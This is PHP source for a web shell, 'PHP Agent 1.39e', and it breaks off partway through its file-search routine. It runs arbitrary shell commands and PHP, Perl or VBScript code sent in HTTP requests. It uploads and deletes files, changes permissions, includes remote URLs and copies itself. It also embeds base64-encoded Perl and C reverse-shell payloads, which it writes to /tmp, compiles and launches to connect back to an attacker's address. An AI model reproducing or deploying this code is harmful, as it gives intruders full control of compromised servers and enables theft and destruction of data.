<?php

$version = "PHP Agent Version 1.39e (c) ".'s'.'o'.'l'.'o'.'s'.'t'.'e'.'l'.'l'." 2007";

function command($cfe)
{
    $res = '';
    if(function_exists('exec'))
    {
      @exec($cfe,$res);
      $res = @join("\n",$res);
    }
    elseif(function_exists('shell_exec'))
    {
      $res = @shell_exec($cfe);
    }
    elseif(function_exists('system'))
    {
      @ob_start();
      @system($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    }
    elseif(function_exists('passthru'))
    {
      @ob_start();
      @passthru($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    }
    elseif(@is_resource($f = @popen($cfe,"r")))
    {
      $res = "";
      while(!@feof($f)) { $res .= @fread($f,1024); }
      @pclose($f);
    }
    return $res;
}

function get_temp_filename()
{
  global $unix;
  $uqt = "tmpU4g764t";
  if ($unix)
  {
     $tmpfname = @tempnam("/tmp", "tmp");
     if (!$tmpfname) $tmpfname = "/tmp/$uqt";

     $tmpfile = @fopen($tmpfname,"wb");
     if (!$tmpfile)
     {
        $tmpfname = @tempnam("/var/tmp", "tmp");;
        $tmpfile = @fopen($tmpfname,"wb");
     }
     if (!$tmpfile)
     {
        $tmpfname = "/var/tmp/$uqt";
        $tmpfile = @fopen($tmpfname,"wb");
     }
     if (!$tmpfile)
     {
        $tmpfname = "./$uqt";
        $tmpfile = @fopen($tmpfname,"wb");
     }
     if ($tmpfile)
     {
         @fclose ($tmpfile);
         @unlink ($tmpfname);
         return $tmpfname;
     } else {
         return "/tmp/tmpU4g764t";
     }
  } else {
     $tmpdir = getenv("TEMP");
     if (empty($tmpdir)) $tmpdir = getenv("TMP");
     if (empty($tmpdir)) $tmpdir = "C:\\WINDOWS\\TEMP";

     $tmpfname = @tempnam($tmpdir, "tmp");
     $tmpfile = @fopen($tmpfname,"wb");
     if (!$tmpfile)
     {
        $tmpfname = "$tmpdir\\$uqt";
        $tmpfile = @fopen($tmpfname,"wb");
     }
     if (!$tmpfile)
     {
        $tmpfname = ".\\$uqt";
        $tmpfile = @fopen($tmpfname,"wb");
     }
     if ($tmpfile)
     {
        @fclose ($tmpfile);
        @unlink ($tmpfname);
        return $tmpfname;
     } else {
       return "C:\\WINDOWS\\TEMP\\$uqt";
     }
  }
}

function to_win_name($filename)
{
   return preg_replace("/\//", "\\", $filename);
}

function eat_file($filename)
{
  global $safe_mode;
  global $unix;
  $contents = '';
  if ($handle = @fopen($filename, "rb"))
  {
    while (!@feof($handle)) {
       $contents .= fread($handle, 8192);
    }
    @fclose($handle);
  } else
  {
    if (!$safe_mode)
    {
      $tmpfname = get_temp_filename();
      $win_name = to_win_name($filename);
      if ($unix) command ("cp '$filename' $tmpfname");
      else       command ("copy \"$win_name\" $tmpfname");

      if ($handle = @fopen($tmpfname, "rb"))
      {
         while (!@feof($handle)) {
            $contents .= fread($handle, 8192);
         }
         @fclose($handle);
      } else {
         if ($unix) $contents = command("cat '$filename'");
         else $contents = command("type \"$win_name\"");
      }
      @unlink($tmpfname);
    }
  }
  return $contents;
}

function create_file($fname,$text)
{
   $w_file = @fopen($fname,"wb");

   if($w_file)
   {
       @fputs($w_file,$text);
       @fclose($w_file);
   } else
     return false;
   return true;
}

function create_file_base64($fname,$text)
{
   $w_file=@fopen($fname,"wb");

   if($w_file)
   {
       @fputs($w_file,@base64_decode($text));
       @fclose($w_file);
   } else
     return false;
   return true;
}

function which($pr)
{
  $path = command("which $pr");
  if (!empty($path)) { return $path; } else { return $pr; }
}

class createZip {

    var $compressedData = array();
    var $centralDirectory = array(); // central directory
    var $endOfCentralDirectory = "\x50\x4b\x05\x06\x00\x00\x00\x00"; //end of Central directory record
    var $oldOffset = 0;

     function addFile($data, $directoryName)   {

        $directoryName = str_replace("\\", "/", $directoryName);

        $feedArrayRow = "\x50\x4b\x03\x04";
        $feedArrayRow .= "\x14\x00";
        $feedArrayRow .= "\x00\x00";
        $feedArrayRow .= "\x08\x00";
        $feedArrayRow .= "\x00\x00\x00\x00";

        $uncompressedLength = strlen($data);
        $compression = crc32($data);
        $gzCompressedData = gzcompress($data);
        $gzCompressedData = substr( substr($gzCompressedData, 0, strlen($gzCompressedData) - 4), 2);
        $compressedLength = strlen($gzCompressedData);
        $feedArrayRow .= pack("V",$compression);
        $feedArrayRow .= pack("V",$compressedLength);
        $feedArrayRow .= pack("V",$uncompressedLength);
        $feedArrayRow .= pack("v", strlen($directoryName) );
        $feedArrayRow .= pack("v", 0 );
        $feedArrayRow .= $directoryName;

        $feedArrayRow .= $gzCompressedData;

        $feedArrayRow .= pack("V",$compression);
        $feedArrayRow .= pack("V",$compressedLength);
        $feedArrayRow .= pack("V",$uncompressedLength);

        $this -> compressedData[] = $feedArrayRow;

        $newOffset = strlen(implode("", $this->compressedData));

        $addCentralRecord = "\x50\x4b\x01\x02";
        $addCentralRecord .="\x00\x00";
        $addCentralRecord .="\x14\x00";
        $addCentralRecord .="\x00\x00";
        $addCentralRecord .="\x08\x00";
        $addCentralRecord .="\x00\x00\x00\x00";
        $addCentralRecord .= pack("V",$compression);
        $addCentralRecord .= pack("V",$compressedLength);
        $addCentralRecord .= pack("V",$uncompressedLength);
        $addCentralRecord .= pack("v", strlen($directoryName) );
        $addCentralRecord .= pack("v", 0 );
        $addCentralRecord .= pack("v", 0 );
        $addCentralRecord .= pack("v", 0 );
        $addCentralRecord .= pack("v", 0 );
        $addCentralRecord .= pack("V", 32 );

        $addCentralRecord .= pack("V", $this -> oldOffset );
        $this -> oldOffset = $newOffset;

        $addCentralRecord .= $directoryName;

        $this -> centralDirectory[] = $addCentralRecord;
    }

    function getZippedfile() {

        $data = implode("", $this -> compressedData);
        $controlDirectory = implode("", $this -> centralDirectory);

        return
            $data.
            $controlDirectory.
            $this -> endOfCentralDirectory.
            pack("v", sizeof($this -> centralDirectory)).
            pack("v", sizeof($this -> centralDirectory)).
            pack("V", strlen($controlDirectory)).
            pack("V", strlen($data)).
            "\x00\x00";
    }
}


function compress(&$filedump)
{
    global $content_encoding;
    global $mime_type;
    if (@function_exists('gzencode'))
    {
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = @gzencode($filedump);
    }
    else
    {
       $mime_type = 'application/octet-stream';
    }
}

function make_zip($files)
{
     if (@function_exists('gzcompress'))
     {
        $zipfile = new createZip();
        foreach ($files as $filename)
        {
          $filedump = eat_file($filename);
          $zipfile->addFile($filedump, $filename); # substr($filename, 0, -4));
        }
        return $zipfile->getZippedfile();
     } else {
        #TODO: use external commands
        return '';
     }
}


function perms($mode)
{
  if (!$GLOBALS['unix']) return 0;
  if( $mode & 0x1000 ) { $type='p'; }
  else if( $mode & 0x2000 ) { $type='c'; }
  else if( $mode & 0x4000 ) { $type='d'; }
  else if( $mode & 0x6000 ) { $type='b'; }
  else if( $mode & 0x8000 ) { $type='-'; }
  else if( $mode & 0xA000 ) { $type='l'; }
  else if( $mode & 0xC000 ) { $type='s'; }
  else $type='u';
  $owner["read"] = ($mode & 00400) ? 'r' : '-';
  $owner["write"] = ($mode & 00200) ? 'w' : '-';
  $owner["execute"] = ($mode & 00100) ? 'x' : '-';
  $group["read"] = ($mode & 00040) ? 'r' : '-';
  $group["write"] = ($mode & 00020) ? 'w' : '-';
  $group["execute"] = ($mode & 00010) ? 'x' : '-';
  $world["read"] = ($mode & 00004) ? 'r' : '-';
  $world["write"] = ($mode & 00002) ? 'w' : '-';
  $world["execute"] = ($mode & 00001) ? 'x' : '-';
  if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
  if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
  if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
  $s=sprintf("%1s", $type);
  $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
  $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
  $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
  return trim($s);
}

function get_cwd()
{
     global $safe_mode;
     global $unix;
     global $HTTP_SERVER_VARS;

     $res = '';

     if (function_exists('getcwd'))
     {
         $res = @getcwd();
         $res = trim($res);
     }
     if (empty($res) && function_exists('posix_getcwd'))
     {
         $res = @posix_getcwd();
     }
     if (empty($res) && function_exists('realpath'))
     {
         $res = @realpath(".");
     }
     if (empty($res) && !$safe_mode)
     {
        if ($unix)
        {
           $res = command("pwd");
        } else {
           $res = command("cd");
        }
        $res = trim($res);
     }
     if (empty($res))
     {
        $selfpath = '';
        $selfpath = $HTTP_SERVER_VARS['SCRIPT_FILENAME'];
        if (empty($selfpath)) $selfpath = $HTTP_SERVER_VARS['PATH_TRANSLATED'];
        if (empty($selfpath)) $selfpath = $HTTP_SERVER_VARS['DOCUMENT_ROOT'].$HTTP_SERVER_VARS['PHP_SELF'];

        if (preg_match('/^(.*)[\/\\\\]([^\/\\\\]*)$/', $selfpath, $matches))
        {
          $res = $matches[1];
        } else {
          $res = $selfpath;
        }
     }
     if (empty($res) && $_ENV['PWD'])
     {
         $res = $_ENV['PWD'];
     }
     return $res;
}

function get_uname()
{
   $res = '';
   global $unix;

   if (empty($res) && function_exists('php_uname'))
   {
      $res = @php_uname();
   }
   if (empty($res) && function_exists('posix_uname'))
   {
      $h = @posix_uname();
      foreach ($h as $k=>$v)
      {
        $res .= "$k=$v ";
      }
   }

   if (empty($res) && !$safe_mode)
   {
     if ($unix)
     {
        $res = command("uname -a");
     } else {
        $res = command("ver");
     }
     $res = trim($res);
   }

   if (empty($res))
   {
      $res = "$_ENV[OSTYPE] $_ENV[OS] $HTTP_SERVER_VARS[SERVER_SOFTWARE]";
   }
   return $res;
}

function is_unix_os()
{
  $dir = @get_cwd();
  $unix = 0;
  if (strlen($dir)>1 && $dir[1]==":") $unix=0; else $unix=1;
  if(empty($dir))
  {
      $uname = get_uname();
      if (@eregi("win",$uname)) { $unix = 0; }
      else { $unix = 1; }
  }
  return $unix;
}

function explode_files ($masklist, $open_dirs = false, $insert_dirnames = false)
{
     $masks = preg_split("/(?<!\\\\)\s+/", $masklist, -1, PREG_SPLIT_NO_EMPTY);
     $result = array();

     foreach ($masks as $mask)
     {
         $mask = preg_replace("/\\\\ /",' ',$mask);
         $glob = array();
         if (@file_exists($mask))
         {
            $glob[] = $mask;
         } else {
            $glob = @glob($mask);
            if (!$glob) continue;
         }

         foreach ($glob as $cur)
         {
               if (is_dir($cur) && $open_dirs)
               {
                 $d=@dir($cur);

                 if ($d)
                 {
                     if ($insert_dirnames) $result[] = "$cur:";
                     if (@substr($cur, -1, 1) != '/') $cur .= '/';

                     while (false !== ($file=$d->read()) )
                     {
                        $result[] = "$cur$file";
                     }
                     $d->close();
                 } else { #error opening dir, treating as file
                     $result[] = $cur;
                 }
               } else {
                  $result[] = $cur;
               }
         }
     }
     return $result;
}

function safe_dir($dir, $recursive = false, $recursive_limit = 0)
{
  global $unix;
  global $fast;
  $res = '';

  if (empty($dir)) $dir = ".";

  $files = explode_files($dir,true,true);
  $curdirs = array();

  if (!$files) return $res;

  foreach ($files as $file)
  {
      #if ($file=="." || $file=="..") continue;
      if (@substr($file,-1,1) == ":")
      {
         $res .= "$file\n";
         continue;
      }

      @clearstatcache();
      if (function_exists('stat'))
         list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = @stat("$file");
      else {
        if (!isset($mtime))   $mtime = @filemtime("$file");
        if (!isset($uid))     $uid = @fileowner("$file");
        if (!isset($gid))     $gid = @filegroup("$file");
        if (!isset($inode))   $inode = @fileinode("$file");
        if (!isset($size))    $size = @filesize("$file");
      }
      if (!isset($size)) $size = 0;

      #if(!$unix){
      #   $res .= date("d.m.Y H:i",$mtime);
      #   if(@is_dir($file)) $res .= "  <DIR> "; else $res .= sprintf("% 8s ",$size);
      #}
      #else
      {
        $owner = array();
        $grpid = array();

        if (isset($uid))
        {
          if (function_exists('posix_getpwuid'))
             $owner = @posix_getpwuid($uid);
          else
           $owner['name'] = $uid;
        }
        if (empty($owner['name'])) $owner['name'] = '?';
        $owner['name'] = trim($owner['name']);


        if (isset($gid))
        {
          if (function_exists('posix_getgrgid'))
              $grpid = @posix_getgrgid($gid);
          else
              $grpid['name'] = $gid;
        }
        if (empty($grpid['name'])) $grpid['name'] = '?';
        $grpid['name'] = trim($grpid['name']);

        $res .= sprintf("% 10d ",$inode);
        @preg_match('/(^|\/|\\\\)([^\/\\\\]+)$/', $file, $shortname);

        if ($unix)
        {
            $res .= perms(@fileperms("$file"));
        } else {
            if (@is_dir($file)) $type = 'd';
            elseif (@is_file($file)) $type = '-';
            elseif (@is_link($file)) $type = 'l';
            elseif ($shortname[2] == "." or $shortname[2] == "..") $type = 'd';
            else $type = '?';

            $res .= $type;
            $res .= "rwx---";
            if (!$fast)
            {
              $read = 0; $write = 0;
              if ($type == '-')
              {
                 if ($handle = @fopen($file,"rb"))
                 {
                    $read = 1;
                    fclose ($handle);
                 }
                 if ($handle = @fopen($file,"ab+"))
                 {
                     $write = 1;
                     fclose($handle);
                 }
              } elseif ($type == 'd')
              {
                 $unique_name = "$file/87never_exists_anywhere54";
                 if ($handle = @fopen($unique_name, "w+"))
                 {
                     $write = 1;
                     @fclose($handle);
                     @unlink($unique_name);
                 }
                 if ($handle = @opendir($file))
                 {
                    $read = 1;
                    @closedir($handle);
                 }
              }
              if ($read) $res .= "r"; else $res .= "-";
              if ($write) $res .= "w"; else $res .= "-";
              $res .= "x";
            } else {
              $res .= "???";
            }
        }
        $res .= sprintf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grpid['name'],$size);
        $res .= date("d.m.Y H:i ",$mtime);

      }

      $res .= "$shortname[2]\n";

      if (@is_dir("$file"))
      {
        if ($shortname[2] != "." && $shortname[2] != "..")
            $curdirs[] = "$file";
      }
   }

  if ($recursive)
  {
      foreach ($curdirs as $dirname)
      {
         if ($recursive_limit <= 0)
         {
             $res .= "\n";
             $res .= safe_dir($dirname, $recursive);
         } else {
             if ($recursive_limit > 1)
             {
                 $res .= "\n";
                 $res .= safe_dir($dirname, $recursive, $recursive_limit-1);
             }
         }
      }
  }
  return $res;
}

function DirFilesR($dir,$types='')
{
    global $safe_mode;
    $files = Array();
    $mark_as_accessable = 0;

    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if (!empty($file) && !$mark_as_accessable)
          {
            $mark_as_accessable = 1;
            $files[] = '';
          }

          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
            if($types)
            {
              $pos = @strrpos($file,".");
              $ext = @substr($file,$pos,@strlen($file)-$pos);
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }

    if (!$files && !$safe_mode && !$mark_as_accessable)
    {
      $listing = command ("ls -1Ra $dir");
      $lines = explode("\n", $listing);

      $curdir = $dir;
      foreach ($lines as $line)
      {
        $line = trim($line);
        if (empty($line)) continue;
        if ($line == "." || $line == "..") continue;

        if (!$mark_as_accessable)
        {
          $mark_as_accessable = 1;
          $files[] = '';
        }

        if (preg_match("/^(.*):$/",$line,$matches))
        {
           $curdir = $matches[1];
        } else {
            if($types)
            {
              $pos = @strrpos($line,".");
              $ext = @substr($line,$pos,@strlen($line)-$pos);
              if(@in_array($ext,explode(';',$types)))
                $files[] = "$curdir/$line";
            } else
                $files[] = "$curdir/$line";
        }
      }
    }
    return $files;
}

function ReadRegistry($path)
{
 #reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Cache"
}

function U_value($value)
{
  if ($value == '') return '';
  if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
  if ($value === null) return 'NULL';
  if (@is_object($value)) $value = (array) $value;
  if (@is_array($value))
  {
    @ob_start();
    print_r($value);
    $value = @ob_get_contents();
    @ob_end_clean();
  }
  return $value;
}

$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";

$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";


#####################################################################

if(version_compare(phpversion(), '4.1.0') == -1)
{
    $_POST   = &$HTTP_POST_VARS;
    $_REQUEST= &$HTTP_POST_VARS;
    $_GET    = &$HTTP_GET_VARS;
    $_SERVER = &$HTTP_SERVER_VARS;
    $_COOKIE = &$HTTP_COOKIE_VARS;
}
if (@get_magic_quotes_gpc())
{
  foreach ($_GET as $k=>$v)
  {
     $_GET[$k] = stripslashes($v);
  }
  foreach ($_POST as $k=>$v)
  {
     $_POST[$k] = stripslashes($v);
  }
  foreach ($_REQUEST as $k=>$v)
  {
     $_REQUEST[$k] = stripslashes($v);
  }
  foreach ($_COOKIE as $k=>$v)
  {
     $_COOKIE[$k] = stripslashes($v);
  }
}


if (function_exists('error_reporting')) @error_reporting(0);
if (function_exists('set_magic_quotes_runtime')) @set_magic_quotes_runtime(0);
if (function_exists('set_time_limit')) @set_time_limit(0);
if (function_exists('ini_set'))
{
  @ini_set('max_execution_time',0);
  @ini_set('output_buffering',0);
#TODO: if version 4.2.3 - 4.0.3.
# @ini_set('upload_max_filesize',"100M");
# if (@ini_get('file_uploads') == false) @ini_set('file_uploads',true);
}

global $safe_mode;
if (function_exists('ini_get'))
{
  $safe_mode = @ini_get('safe_mode');
} else {
  $safe_mode = 0;
}

global $unix;
$unix = is_unix_os();

if (function_exists('umask'))
{
    $umask = 0755;
}

$envelope = isset($_REQUEST['envelope']);

#####################################################################
  if ($envelope)
  {
     echo '__START__9034785902347509238476034857607834__START__';
  }

  global $output;
  $output = '';
  global $compress;
  $compress = empty($_REQUEST['compress']) ? 0 : $_REQUEST['compress'];
  global $use_exec;
  $use_exec = empty($_REQUEST['use_exec']) ? 0 : $_REQUEST['use_exec'];
  global $fast;
  $fast = empty($_REQUEST['rfast']) ? 0 : $_REQUEST['rfast'];

  if (!empty($_REQUEST['not_exec']) && $_REQUEST['not_exec']) $safe_mode = 1;

  $scmd = empty($_REQUEST['spec'])    ? '' : $_REQUEST['spec'];
  if (empty($scmd))
      $scmd = empty($_REQUEST['scmd'])    ? '' : $_REQUEST['scmd'];

  $cfe =  empty($_REQUEST['cfe'])    ? '' : $_REQUEST['cfe'];
  if (empty($cfe))
    $cfe =  empty($_REQUEST['rcmd'])    ? '' : $_REQUEST['rcmd'];

  $ffr  = empty($_REQUEST['rfile'])   ? '' : $_REQUEST['rfile'];
  $ffrs = empty($_REQUEST['rfiles'])  ? '' : $_REQUEST['rfiles'];
  $dfr  = empty($_REQUEST['rdir'])    ? '' : $_REQUEST['rdir'];
  $dfra = empty($_REQUEST['rdirall']) ? '' : $_REQUEST['rdirall'];
  $info = empty($_REQUEST['rinfo'])   ? '' : $_REQUEST['rinfo'];

  if (!empty($HTTP_POST_FILES['userfile']['name']))
  {
    if(!empty($_REQUEST['rname']))
    {
      $nfn = $_REQUEST['rname'];
    } else {
      $nfn = $HTTP_POST_FILES['userfile']['name'];
    }

    $tmp_name = $HTTP_POST_FILES['userfile']['tmp_name'];
    $tmp_size = $HTTP_POST_FILES['userfile']['size'];

    $upload_file = @fopen($tmp_name, "rb");
    if ($upload_file) $target_file = @fopen($nfn, "wb");

    if ($target_file && $upload_file && !$use_exec)
    {
        $write_data = @fread($upload_file, $tmp_size);
        @fwrite($target_file, $write_data);

        @fclose($target_file);
        @fclose($upload_file);

        echo "1\n$nfn upload by fwrite ok";
    } else {
        if ($target_file) @fclose($target_file);
        if ($upload_file) @fclose($upload_file);

        if (!$use_exec && @copy($tmp_name, $nfn))
        {
          echo "1\n$nfn upload by copy ok";
        } else {
          $cmd = "cp $tmp_name $nfn 2>&1";

          echo "@copy failed. Trying $cmd\n";
          $cpres = command($cmd);
          if (empty($cpres))
          {
              echo "1\n$nfn upload by cp ok";
          } else {
              $cmd = "cat $tmp_name >$nfn";
              echo "cp failed. Trying $cmd\n";
              $cpres = command($cmd);
              if (@filesize($nfn) == $tmp_size)
              {
                echo "1\n$name upload by cat ok";
              } else {
                echo "0\n$name upload error";
              }
          }
        }
    }
  }

  if (!empty($scmd))
  {
    if ($scmd == "upload-agent" || $scmd == "upload-data" || $scmd == "upload-url")
    {
       $agent = '';
       if ($scmd == "upload-agent")
       {
          $aagent = @file(__FILE__);
          $agent = @join("", $aagent);
       } elseif ($scmd == "upload-data") {
          $agent = $_REQUEST['data'];
       } elseif ($scmd == "upload-url") {
          $agent = @file_get_contents($_REQUEST['rurl']);
       }

       if (empty($agent))
       {
           echo "error downloading data\n";
       }

       if (!empty($agent))
       {
         $name = $_REQUEST['rname'];
         if (empty($name))
         {
            $name = "agent.php";
         }

         $file = '';
         if (!$use_exec)
             $file = @fopen($name,"wb");

         if ($file)
         {
            @fwrite($file, $agent);
            @fclose($file);
            echo "1\n$name upload ok";
         } else {
            print "php file restriction is on\n";

            $tmpfname = get_temp_filename();

            if ($tmpfile = @fopen($tmpfname, "wb"))
            {
              @fwrite($tmpfile, $agent);
              @fclose($tmpfile);
            } elseif (!$safe_mode) {
              echo "can't open for write any temp file $tmpfname\n";
              $esc_agent = @escapeshellarg($agent);
              command("echo $esc_agent >$tmpfname");
            }

            if (!$use_exec && @copy($tmpfname, $name))
            {
              echo "1\n$name upload ok";
            } else {
              if (!$safe_mode)
              {
                $cmd = "cp $tmpfname $name 2>&1";
                if (!$unix) $cmd = "copy $tmpfname $name";

                echo "@copy failed. Trying $cmd\n";
                $cpres = command($cmd);
                if (empty($cpres))
                {
                  echo "1\n$name upload ok";
                } elseif (!$safe_mode) {
                  $cmd = "cat $tmpfname >$name";
                  if (!$unix) $cmd = "type $tmpfname >$name";

                  echo "cp failed. Trying $cmd\n";
                  $cpres = command($cmd);
                  if (@file_exists($name))
                  {
                    echo "1\n$name upload ok";
                  } else {
                    echo "0\n$name upload error";
                  }
                }
              }
            }

            @unlink($tmpfname);
         }
       }
    }

    if ($scmd == "rm")
    {
         $masks = $_REQUEST['rname'];
         if (!empty($masks))
         {
            $files = explode_files($masks);
            foreach ($files as $file)
            {
              if ($use_exec || !@unlink($file))
              {
                if ($unix)
                {
                  $output .= command("rm -f $file");
                } else {
                  $output .= command("del /Q $file");
                }
              }
            }
         }
    }
    if ($scmd == "cp")
    {
         $name1 = $_REQUEST['rname1'];
         $name2 = $_REQUEST['rname2'];
         if (!empty($name1) && !empty($name2))
         {
            if ($use_exec || !@copy($name1, $name2))
            {
              if ($unix)
              {
                $output .= command("cp -f $name1 $name2");
              } else {
                $output .= command("copy /Y $name1 $name2");
              }
            }
         }
    }
    if ($scmd == "mv")
    {
         $name1 = $_REQUEST['rname1'];
         $name2 = $_REQUEST['rname2'];
         if (!empty($name1) && !empty($name2))
         {
            if ($use_exec || !@rename($name1, $name2))
            {
              if ($unix)
              {
                $output .= command("mv -f $name1 $name2");
              } else {
                $output .= command("move /Y $name1 $name2");
              }
            }
         }
    }
    if ($scmd == "rmdir")
    {
         $name = $_REQUEST['rname'];
         if (!empty($name))
         {
            if ($use_exec || !@rmdir($name))
            {
               $output .= command("rmdir $name");
            }
         }
    }
    if ($scmd == "mkdir")
    {
         $name = $_REQUEST['rname'];
         if (!empty($name))
         {
            if ($use_exec || !@mkdir($name))
            {
               $output .= command("mkdir $name");
            }
         }
    }

    if ($scmd == "chmod")
    {
         $mode  = $_REQUEST['rmode'];
         $masks = $_REQUEST['rname'];
         if (!empty($masks) && !empty($mode))
         {
            $files = explode_files($masks);
            foreach ($files as $name)
            {
              if ($use_exec || !@chmod($name,$mode))
              {
                 $output .= command("chmod $mode $name");
              }
            }
         }
    }

    if ($scmd == "chown")
    {
         $owner  = $_REQUEST['rowner'];
         $masks = $_REQUEST['rname'];
         if (!empty($masks) && !empty($owner))
         {
            $files = explode_files($masks);
            foreach ($files as $name)
            {
              if ($use_exec || !@chown($name,$owner))
              {
                $output .= command("chown $owner $name");
              }
            }
         }
    }

    if ($scmd == "chgrp")
    {
         $masks = $_REQUEST['rname'];
         $grp  = $_REQUEST['rgrp'];
         if (!empty($masks) && !empty($grp))
         {
            $files = explode_files($masks);
            foreach ($files as $name)
            {
              if ($use_exec || !@chgrp($name,$grp))
              {
                $output .= command("chgrp $grp $name");
              }
            }
         }
    }

    if ($scmd == "back-perl")
    {
      $rip = $_REQUEST['rip'] ? $_REQUEST['rip'] : $_SERVER['REMOTE_ADDR'];
      $rport = $_REQUEST['rport'] ? $_REQUEST['rport'] : 11457;

      create_file_base64("/tmp/back",$back_connect);
      $p2=which("perl");
      $blah = command($p2." /tmp/back $rip $rport &");
    }

    if ($scmd == "back-c")
    {
      $rip = $_REQUEST['rip'] ? $_REQUEST['rip'] : $_SERVER['REMOTE_ADDR'];
      $rport = $_REQUEST['rport'] ? $_REQUEST['rport'] : 11457;

      create_file_base64("/tmp/back.c",$back_connect_c);
      $blah = command("gcc -o /tmp/backc /tmp/back.c");
      @unlink("/tmp/back.c");
      $blah = command("/tmp/backc $rip $rport &");
    }

    if ($scmd == "eval-php")
    {
      $code = $_REQUEST['rcode'];
      if (!empty($code))
      {
          $res = @eval ($code);
          if ($res) $output = $res;

          if (!empty($output))
          {
            if ($compress) compress($output);
            echo $output;
          }
      }
    }

    if ($scmd == "eval-perl")
    {
      $code = $_REQUEST['rcode'];
      if (!empty($code))
      {
          $p2 = which("perl");
          $tmpfname = get_temp_filename();
          create_file($tmpfname,$code);
          $output = command("$p2 $tmpfname");
          @unlink($tmpfname);

          if (!empty($output))
          {
            if ($compress) compress($output);
            echo $output;
          }
      }
    }

    if ($scmd == "eval-vbs")
    {
      $code = $_REQUEST['rcode'];
      if (!empty($code))
      {
          $tmpfname = get_temp_filename();
          create_file($tmpfname,$code);
          $output = command("cscript.exe /Nologo /E:Vbscript $tmpfname");
          @unlink($tmpfname);

          if (!empty($output))
          {
            if ($compress) compress($output);
            echo $output;
          }
      }
    }

    if ($scmd == "include")
    {
      include($_REQUEST['rurl']);
    }

    if ($scmd == "search")
    {
       $pattern = $_REQUEST['pattern'];
       $grepmode = !empty($_REQUEST['grepmode']) ? $_REQUEST['grepmode'] : 0;

       $files = array();
       $output = '';

       if (!empty($_REQUEST['tdir']))
       {
           $exts = $_REQUEST['exts'];
           $target = $_REQUEST['tdir'];
           $files = DirFilesR($target, $exts);
       } elseif (!empty($_REQUEST['tfile'])) {
           $files[] = $_REQUEST['tfile'];
       }

       if ($files)
       {
         foreach ($files as $file)
         {
            if (empty($file)) continue;

            $content = eat_file($file);
            if (!empty($content))
            {
              if ($grepmode == 0)
              {
                  if (preg_match("$pattern", $content))
                     $output .= "$file\n";
              } else {
                  $repfile = false;

                  if (preg_match_all("$pattern", $content, $matches, PREG_PATTERN_ORDER))
                  {
